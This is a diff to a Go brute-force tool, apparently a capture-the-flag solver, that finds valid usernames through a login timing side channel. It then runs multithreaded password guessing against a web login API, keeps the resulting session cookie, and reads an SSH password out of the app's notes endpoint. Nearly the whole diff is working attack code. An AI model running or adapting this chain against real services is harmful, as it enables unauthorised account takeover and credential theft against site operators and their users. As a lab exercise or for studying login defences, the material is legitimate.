@@ -8,6 +8,8 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/http/cookiejar"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -31,6 +33,10 @@ type LoginResponse struct {
 	Status string `json:"status"`
 }
 
+type Note struct {
+	Content string `json:"noteContent"`
+}
+
 type UserCredentials struct {
 	Username string
 	Password string
@@ -38,7 +44,83 @@ type UserCredentials struct {
 
 var USERNAMES_DISCOVERED []string = []string{}
 var CREDENTIALS_DISCOVERED []UserCredentials = []UserCredentials{}
+var SESSIONS_GRANTED http.Client = http.Client{Timeout: 30 * time.Second}
 
+var TIMEOUT float64
+
+//============================================================
+//
+// Function Name: GrabSSHPass
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to contact the note/list API
+//    endpoint and pull out the SSH key for the user.
+//
+// Input(s):
+//
+//    baseURL - string. base URL to use for HTTP request.
+//
+// Return(s):
+//
+//    sshpass - string. ssh password extracted from endpoint.
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
+func GrabSSHPass(baseURL string) (sshpass string, success bool, message string) {
+	var notesreturned []Note = []Note{}
+	var notecontent Note = Note{}
+
+	resp, err := SESSIONS_GRANTED.Get(fmt.Sprintf("%s/api/note/list", baseURL))
+	if err != nil {
+		ErrMsg(err.Error())
+		os.Exit(1)
+	}
+	defer resp.Body.Close()
+
+	bodycontent, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		ErrMsg(err.Error())
+		os.Exit(1)
+	}
+
+	err = json.Unmarshal(bodycontent, &notesreturned)
+	if err != nil {
+		return "", false, err.Error()
+	}
+
+	notecontent = notesreturned[0]
+	sentencewords := strings.Split(notecontent.Content, " ")
+	sshpass = sentencewords[len(sentencewords)-1]
+
+	return sshpass, true, "SSH password grabbed"
+}
+
+//============================================================
+//
+// Function Name: WordlistGenerator
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to loop through a wordlist
+//    and feed the data into a string channel line-by-line.
+//
+// Input(s):
+//
+//    wordlist - string. file containing words to loop through.
+//    c - chan string. channel to send words into.
+//
+// Return(s):
+//
+//    success - bool. indication of successful execution.
+//    message - string. status message.
+//
+//============================================================
 func WordlistGenerator(wordlist string, c chan string) (success bool, message string) {
 	defer close(c)
 
@@ -58,6 +140,29 @@ func WordlistGenerator(wordlist string, c chan string) (success bool, message st
 	return true, "worlist looped through successfully"
 }
 
+//============================================================
+//
+// Function Name: TestCreds
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to attempt a brute-force
+//    attack against a target URL. It loops through the
+//    usernames that have been discovered and saved and
+//    attempts to find valid login credentials.
+//
+// Input(s):
+//
+//    targetURL - string. full URL of the login page.
+//    passwordlist - string. file containng list of passwords.
+//
+// Return(s):
+//
+//    None.
+//
+//============================================================
 func TestCreds(targetURL string, passwordlist string) {
 	var datachan chan string = make(chan string)
 	var exitflag bool
@@ -74,6 +179,30 @@ func TestCreds(targetURL string, passwordlist string) {
 	return
 }
 
+//============================================================
+//
+// Function Name: TestPassword
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to loop through a wordlist
+//    and test the usernames read from the channel.
+//
+// Input(s):
+//
+//    targetURL - string. full URL of the login page.
+//    username - string. username to test creds of.
+//    c - chan string. channel to get passwords from.
+//    wg - *sync.WaitGroup. waitgroup the thread belongs to.
+//    exitflag - *bool. indicates successful credential found.
+//
+// Return(s):
+//
+//    None.
+//
+//============================================================
 func TestPassword(targetURL string, username string, c chan string, wg *sync.WaitGroup, exitflag *bool) {
 	defer wg.Done()
 	var logindata LoginRequestData = LoginRequestData{Username: username}
@@ -109,6 +238,11 @@ func TestPassword(targetURL string, username string, c chan string, wg *sync.Wai
 				json.Unmarshal(returnbytes, &responsedata)
 				if strings.ToLower(responsedata.Status) != "invalid username or password" {
 					SucMsg(fmt.Sprintf("Credentials Discovered: \"%s:%s\"", username, password))
+					cookieurl, err := url.Parse(targetURL)
+					if err != nil {
+						continue
+					}
+					SESSIONS_GRANTED.Jar.SetCookies(cookieurl, resp.Cookies())
 					*exitflag = true
 					resp.Body.Close()
 					return
@@ -121,6 +255,28 @@ func TestPassword(targetURL string, username string, c chan string, wg *sync.Wai
 	return
 }
 
+//============================================================
+//
+// Function Name: TestPassword
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to test the validity of
+//    a username.
+//
+// Input(s):
+//
+//    targetURL - string. full URL of the login page.
+//    c - chan string. channel to get passwords from.
+//    wg - *sync.WaitGroup. waitgroup the thread belongs to.
+//
+// Return(s):
+//
+//    None.
+//
+//============================================================
 func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
 	defer wg.Done()
 	var logindata LoginRequestData = LoginRequestData{Password: "invalidpassword!"}
@@ -146,7 +302,7 @@ func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
 			} else {
 				resp.Body.Close()
 				timediff := time.Now().Sub(timenow)
-				if timediff > time.Second {
+				if time.Duration(timediff).Seconds() > (TIMEOUT * time.Duration(time.Second).Seconds()) {
 					SucMsg(fmt.Sprintf("Username Found: \"%s\"", logindata.Username))
 					USERNAMES_DISCOVERED = append(USERNAMES_DISCOVERED, username)
 				}
@@ -156,6 +312,29 @@ func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
 	return
 }
 
+//============================================================
+//
+// Function Name: FindUsername
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    This function is designed to spawn multiple threads
+//    used to brute-force a username.
+//
+// Input(s):
+//
+//    baseURL - string. root URL for the target.
+//    wordlist - string. wordlist to use for username brute.
+//    threadcount - int. number of threads to spawn for brute.
+//
+// Return(s):
+//
+//    success - bool. indication of username found.
+//    message - string. status message.
+//
+//============================================================
 func FindUsername(baseURL string, wordlist string, threadcount int) (success bool, message string) {
 	var namechan chan string = make(chan string)
 	var wg *sync.WaitGroup = new(sync.WaitGroup)
@@ -253,6 +432,7 @@ func main() {
 	flag.IntVar(&threadCount, "t", 10, "number of threads used to brute force")
 	flag.StringVar(&wordlistp, "P", "passwords.txt", "wordlist to use in password brute force")
 	flag.StringVar(&wordlistu, "U", "names_short.txt", "wordlist to use in username brute force")
+	flag.Float64Var(&TIMEOUT, "T", 1.5, "timeout (seconds) for HTTP request.")
 	flag.Parse()
 
 	valid, message := ValidatePort(targetPort)
@@ -284,7 +464,29 @@ func main() {
 	SucMsg(message)
 
 	if brutelogin {
+		sessionjar, err := cookiejar.New(nil)
+		if err != nil {
+			ErrMsg(err.Error())
+			os.Exit(1)
+		}
+
+		SESSIONS_GRANTED.Jar = sessionjar
+
 		TestCreds(fmt.Sprintf("%s/api/user/login", baseURL), wordlistp)
+
+		cookieurl, err := url.Parse(baseURL)
+		if err != nil {
+			ErrMsg(err.Error())
+			os.Exit(1)
+		}
+		if len(SESSIONS_GRANTED.Jar.Cookies(cookieurl)) > 0 {
+			sshpassword, success, message := GrabSSHPass(baseURL)
+			if !success {
+				ErrMsg(message)
+				os.Exit(1)
+			}
+			SucMsg(fmt.Sprintf("SSH Password: %s", sshpassword))
+		}
 	}
 	return
 }
